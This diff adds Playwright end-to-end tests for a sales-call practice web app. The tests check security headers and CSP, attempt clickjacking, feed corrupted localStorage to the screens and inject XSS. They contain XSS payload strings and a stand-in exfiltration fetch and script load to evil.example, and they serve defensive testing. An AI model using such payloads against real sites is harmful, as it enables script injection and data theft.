@@ -18,9 +18,11 @@
  */
 
 import { spawn } from 'node:child_process';
+import { createServer } from 'node:http';
 import { readFileSync } from 'node:fs';
 import { createRequire } from 'node:module';
 import process from 'node:process';
+import { startProdServer } from './prod-server.mjs';
 
 const PORT = Number(process.env.PORT ?? 4173);
 const BASE_URL = process.env.BASE_URL ?? `http://localhost:${PORT}`;
@@ -99,7 +101,11 @@ async function startServer() {
   }
 }
 
+/** Servidor que aplica as regras do vercel.json (headers/CSP). Ver e2e/prod-server.mjs. */
+let prod = null;
+
 function stopServer() {
+  if (prod) void prod.close();
   if (server && !server.killed) server.kill('SIGTERM');
 }
 
@@ -201,6 +207,7 @@ async function runCallToScorecard(page) {
 
 async function main() {
   await startServer();
+  prod = await startProdServer(Number(process.env.PROD_PORT ?? 4180));
   browser = await chromium.launch({ headless: HEADLESS });
   console.log(`\nE2E em ${BASE_URL}\n`);
 
@@ -446,6 +453,242 @@ async function main() {
       await audit(page, 'email: resultado');
     });
   }
+
+
+  // ---- Segurança: o que o navegador de um usuário real vai impor ----
+  //
+  // `vite preview` NÃO lê o vercel.json, então os headers de segurança nunca
+  // tinham rodado contra o build. Estes checks usam e2e/prod-server.mjs, que
+  // serve dist/ com EXATAMENTE as regras do vercel.json.
+  const PROD = prod.url;
+
+  await check('SEGURANÇA: headers do vercel.json estão presentes no documento', async (page) => {
+    const res = await page.request.get(`${PROD}/`);
+    const h = res.headers();
+    const need = {
+      'content-security-policy': /default-src 'self'.*frame-ancestors 'none'.*object-src 'none'/,
+      'strict-transport-security': /max-age=\d{7,}/,
+      'x-frame-options': /^DENY$/i,
+      'x-content-type-options': /^nosniff$/i,
+      'referrer-policy': /strict-origin/,
+      'permissions-policy': /camera=\(\)/,
+      'cross-origin-opener-policy': /^same-origin$/,
+      'cross-origin-resource-policy': /^same-origin$/,
+    };
+    for (const [name, re] of Object.entries(need)) {
+      if (!h[name]) throw new Error(`header ausente: ${name}`);
+      if (!re.test(h[name])) throw new Error(`header ${name} com valor inesperado: ${h[name]}`);
+    }
+    // A política não pode ter sido afrouxada: nada de unsafe-eval/inline em script.
+    const scriptSrc = /script-src([^;]*)/.exec(h['content-security-policy'])?.[1] ?? '';
+    if (/unsafe-(eval|inline)|\*/.test(scriptSrc)) throw new Error(`script-src afrouxado: ${scriptSrc}`);
+  }, { collectErrors: false });
+
+  await check('SEGURANÇA: o CSP não bloqueia o app e bloqueia script inline/externo/exfiltração', async (page) => {
+    await page.addInitScript(() => {
+      window.__csp = [];
+      document.addEventListener('securitypolicyviolation', (e) => window.__csp.push(`${e.violatedDirective} ← ${e.blockedURI}`));
+    });
+    // Uso normal completo sob o CSP real, incluindo o service worker.
+    for (const route of ['/', '/drill', '/email', '/library', '/legal', '/progress']) {
+      await page.goto(`${PROD}${route}`, { waitUntil: 'networkidle' });
+    }
+    await page.goto(`${PROD}/`, { waitUntil: 'networkidle' });
+    await page.getByRole('link', { name: /Start call/i }).first().click();
+    await page.locator('button').nth(-2).click();
+    await page.locator('button').last().click();
+    const input = page.getByPlaceholder(/Type your line/i);
+    await expectVisible(input, 'campo da call sob o CSP');
+    await input.fill('Hi, quick question about follow-ups.');
+    await page.getByRole('button', { name: /^Send$/ }).click();
+    await page.waitForTimeout(1200);
+
+    const violationsBefore = await page.evaluate(() => window.__csp.length);
+    if (violationsBefore > 0) {
+      const list = await page.evaluate(() => window.__csp.join(' | '));
+      throw new Error(`o CSP bloqueou o próprio app: ${list}`);
+    }
+    // Agora o ataque: tem de ser bloqueado. (eval fica de fora de propósito: o
+    // DevTools Protocol é isento de CSP, então um eval via page.evaluate roda
+    // mesmo com a política ativa e não prova nada.)
+    const r = await page.evaluate(async () => {
+      const s = document.createElement('script');
+      s.textContent = 'window.__inline = 1';
+      document.head.appendChild(s);
+      await new Promise((ok) => {
+        const x = document.createElement('script');
+        x.src = 'https://evil.example/x.js';
+        x.onerror = x.onload = () => ok();
+        document.head.appendChild(x);
+        setTimeout(ok, 1500);
+      });
+      let exfil = 'permitido';
+      try { await fetch('https://evil.example/', { mode: 'no-cors' }); } catch { exfil = 'bloqueado'; }
+      return { inline: window.__inline === 1, exfil, violations: window.__csp.length };
+    });
+    if (r.inline) throw new Error('script inline executou apesar do CSP');
+    if (r.exfil !== 'bloqueado') throw new Error('fetch para origem externa não foi bloqueado');
+    if (r.violations < 2) throw new Error(`esperava ≥2 violações registradas, vieram ${r.violations}`);
+  }, { collectErrors: false });
+
+  await check('SEGURANÇA: outra origem não consegue embutir o app em iframe (clickjacking)', async (page) => {
+    const evil = createServer((_q, res) => {
+      res.writeHead(200, { 'content-type': 'text/html' });
+      res.end(`<iframe src="${PROD}/"></iframe>`);
+    });
+    await new Promise((ok) => evil.listen(Number(process.env.EVIL_PORT ?? 4181), '127.0.0.1', ok));
+    try {
+      await page.goto(`http://127.0.0.1:${process.env.EVIL_PORT ?? 4181}/`);
+      await page.waitForTimeout(1200);
+      const loaded = page.frames().some((f) => f.url().startsWith(PROD));
+      if (loaded) throw new Error('o app carregou dentro de um iframe de outra origem');
+    } finally {
+      evil.close();
+    }
+  }, { collectErrors: false });
+
+  // ---- Dado hostil: o que acontece quando o storage ou um backup é ruim ----
+
+  await check('ROBUSTEZ: dado adulterado no localStorage não derruba nenhuma tela', async () => {
+    // Antes, 4 destes formatos derrubavam telas — dois derrubavam a Home — e como o
+    // dado ruim ficava no storage, recarregar não resolvia.
+    const SC = '00000000-0000-4000-8000-000000000301';
+    const mutations = {
+      'sessions=[{id}]': { 'act.sessions': '[{"id":"x"}]' },
+      'sessions=[null]': { 'act.sessions': '[null]' },
+      'sessions="texto"': { 'act.sessions': '"texto"' },
+      'turns com content objeto': { 'act.turns': '[{"id":"t","session_id":"x","speaker":"rep","content":{"a":1},"ts":"x"}]' },
+      'evaluations sem campos': { 'act.evaluations': '[{"id":"e","session_id":"s"}]' },
+      'products=[{id}]': { 'act.custom_products': '[{"id":"p"}]' },
+      'personas=[{id}]': { 'act.custom_personas': '[{"id":"a"}]' },
+      'scenarios refs inexistentes': { 'act.custom_scenarios': '[{"id":"s","persona_id":"nope","product_id":"nope","call_type":"cold_call","difficulty":3,"language":"pt-BR","time_limit_seconds":300,"success_criteria":"x"}]' },
+      'ui_lang=constructor': { 'act.ui_lang': 'constructor' },
+      'drill.history="x"': { 'act.drill.history': '"x"' },
+      'drill.best="x"': { 'act.drill.best': '"x"' },
+    };
+    const routes = ['/', '/progress', '/library', '/drill', '/email', `/call/${SC}`];
+    const broken = [];
+    for (const [label, data] of Object.entries(mutations)) {
+      const ctx = await browser.newContext();
+      const p = await ctx.newPage();
+      await p.addInitScript((d) => {
+        try {
+          localStorage.setItem('act.onboarded', '1');
+          if (localStorage.getItem('act.ui_lang') === null) localStorage.setItem('act.ui_lang', 'en');
+          for (const [k, v] of Object.entries(d)) localStorage.setItem(k, v);
+        } catch { /* ignora */ }
+      }, data);
+      for (const route of routes) {
+        await p.goto(`${BASE_URL}${route}`, { waitUntil: 'domcontentloaded' }).catch(() => {});
+        await p.waitForTimeout(350);
+        const bad = await p.evaluate(() =>
+          !!document.querySelector('[role=alert]') || (document.querySelector('main')?.innerText ?? '').trim().length < 5,
+        );
+        if (bad) broken.push(`${label} → ${route}`);
+      }
+      await ctx.close();
+    }
+    if (broken.length) throw new Error(`telas derrubadas:\n       ${broken.join('\n       ')}`);
+  }, { collectErrors: false });
+
+  await check('SEGURANÇA: payloads XSS em campos, backup importado e URL não executam', async (page) => {
+    const PAY = '<img src=x onerror="window.__xss=(window.__xss||0)+1"><svg/onload=window.__xss=2><script>window.__xss=3</script>';
+    page.on('dialog', (d) => d.dismiss());
+    await page.goto(`${BASE_URL}/progress`, { waitUntil: 'networkidle' });
+    const backup = {
+      sessions: [], turns: [], evaluations: [], products: [],
+      personas: [{ id: 'evil', name: PAY, role: PAY, company_profile: PAY, personality: { skepticism: 1, patience: 1, talkativeness: 1 }, pain_points: [PAY], hidden_objections: [PAY], buying_stage: 'cold' }],
+      scenarios: [{ id: 'evil-s', persona_id: 'evil', product_id: '00000000-0000-4000-8000-000000000101', call_type: 'cold_call', difficulty: 3, language: 'en-US', time_limit_seconds: 300, success_criteria: PAY }],
+    };
+    await page.setInputFiles('input[type=file]', { name: 'b.json', mimeType: 'application/json', buffer: Buffer.from(JSON.stringify(backup)) });
+    await page.waitForTimeout(500);
+    let displayed = false;
+    for (const route of ['/', '/call/evil-s', `/call/${encodeURIComponent(PAY)}`, `/?q=${encodeURIComponent(PAY)}#${encodeURIComponent(PAY)}`]) {
+      await page.goto(`${BASE_URL}${route}`, { waitUntil: 'networkidle' });
+      const r = await page.evaluate(() => ({
+        xss: window.__xss ?? 0,
+        nodes: document.querySelectorAll('img[src="x"], svg[onload]').length,
+        shown: document.body.innerText.includes('<img src=x'),
+      }));
+      if (r.xss || r.nodes) throw new Error(`XSS executou em ${route}: exec=${r.xss} nós=${r.nodes}`);
+      displayed ||= r.shown;
+    }
+    // Sem isto o teste passaria vazio: o payload tem de ter sido EXIBIDO como texto.
+    if (!displayed) throw new Error('o payload nunca foi exibido — o teste não exercitou nada');
+  }, { collectErrors: false });
+
+  await check('ROBUSTEZ: o ErrorBoundary oferece apagar os dados e isso funciona', async (page) => {
+    await page.route('**/assets/Drill-*.js', (route) => route.abort());
+    await page.goto(`${BASE_URL}/drill`, { waitUntil: 'domcontentloaded' });
+    await expectVisible(page.getByRole('alert'), 'cartão do ErrorBoundary');
+    await page.evaluate(() => localStorage.setItem('act.marker', 'apagar-me'));
+    page.once('dialog', (d) => d.accept());
+    await page.getByRole('button', { name: /Reset app data/i }).click();
+    await page.waitForURL(`${BASE_URL}/`);
+    const left = await page.evaluate(() => localStorage.getItem('act.marker'));
+    if (left !== null) throw new Error('a chave act.* sobreviveu ao reset');
+  }, { collectErrors: false });
+
+
+  await check('BIBLIOTECA: produto, persona e cenário próprios sobrevivem aos guardas de schema e rodam uma call', async (page) => {
+    // A validação de schema agora filtra NA LEITURA. Se os formulários gerassem
+    // algo que o guarda recusa, o item criado sumiria depois de salvar. Este é o
+    // fluxo que prova que não: criar os três, ver cada um listado e usá-los.
+    await page.goto(`${BASE_URL}/library`, { waitUntil: 'networkidle' });
+
+    // Produto
+    await page.getByRole('button', { name: /^Products$/ }).click();
+    await page.getByRole('button', { name: /New product/ }).click();
+    await page.getByLabel(/^Name$/).fill('Acme Dialer');
+    await page.getByLabel(/^Vendor$/).fill('Acme Inc');
+    await page.getByLabel(/One-liner pitch/).fill('Calls that book themselves');
+    await page.getByRole('button', { name: /^Save$/ }).click();
+    await expectVisible(page.getByText('Acme Dialer'), 'produto salvo na lista');
+
+    // Persona
+    await page.getByRole('button', { name: /^Personas$/ }).click();
+    await page.getByRole('button', { name: /New persona/ }).click();
+    await page.getByLabel(/^Name$/).fill('Dana Whitfield');
+    await page.getByLabel(/^Role$/).fill('VP Revenue');
+    await page.getByLabel(/Company profile/).fill('Mid-market SaaS, 120 reps.');
+    await page.getByLabel(/Pain points/).fill('Reps skip follow-ups\nForecasts are wrong');
+    await page.getByLabel(/Hidden objections/).fill('We already have a dialer');
+    await page.getByRole('button', { name: /^Save$/ }).click();
+    await expectVisible(page.getByText('Dana Whitfield'), 'persona salva na lista');
+
+    // Cenário usando os dois
+    await page.getByRole('button', { name: /^Scenarios$/ }).click();
+    await page.getByRole('button', { name: /New scenario/ }).click();
+    // getByRole usa o nome ACESSÍVEL ("Persona"); getByLabel casaria com o texto bruto do
+    // <label>, que inclui as opções do <select> aninhado.
+    await page.getByRole('combobox', { name: 'Persona', exact: true }).selectOption({ label: 'Dana Whitfield — VP Revenue' });
+    await page.getByRole('combobox', { name: 'Product', exact: true }).selectOption({ label: 'Acme Dialer' });
+    await page.getByLabel(/Success criteria/).fill('Book a 20-minute demo.');
+    await page.getByRole('button', { name: /^Save$/ }).click();
+
+    // Sobrevive a um reload (passa pelo storage e pelo guarda de novo)...
+    await page.reload({ waitUntil: 'networkidle' });
+    await page.getByRole('button', { name: /^Products$/ }).click();
+    await expectVisible(page.getByText('Acme Dialer'), 'produto depois do reload');
+    await page.getByRole('button', { name: /^Personas$/ }).click();
+    await expectVisible(page.getByText('Dana Whitfield'), 'persona depois do reload');
+
+    // ...aparece na Home e roda uma call completa.
+    await page.goto(`${BASE_URL}/`, { waitUntil: 'networkidle' });
+    const card = page.locator('div', { hasText: 'Dana Whitfield' }).filter({ has: page.getByRole('link', { name: /Start call/i }) }).last();
+    await expectVisible(card, 'cenário personalizado na Home');
+    await card.getByRole('link', { name: /Start call/i }).click();
+    await page.locator('button').nth(-2).click();
+    await page.locator('button').last().click();
+    const input = page.getByPlaceholder(/Type your line/i);
+    await expectVisible(input, 'call com cenário personalizado');
+    await input.fill('Hi Dana, quick question about how your reps handle follow-ups.');
+    await page.getByRole('button', { name: /^Send$/ }).click();
+    await page.waitForTimeout(1300);
+    await page.getByRole('button', { name: /Hang up/i }).click();
+    await page.getByRole('button', { name: /Just ended the practice/i }).click();
+    await page.waitForURL(/\/scorecard\//, { timeout: 30_000 });
+  });
 
   await check('PWA: manifest e service worker servidos', async (page) => {
     for (const path of ['/manifest.webmanifest', '/sw.js']) {
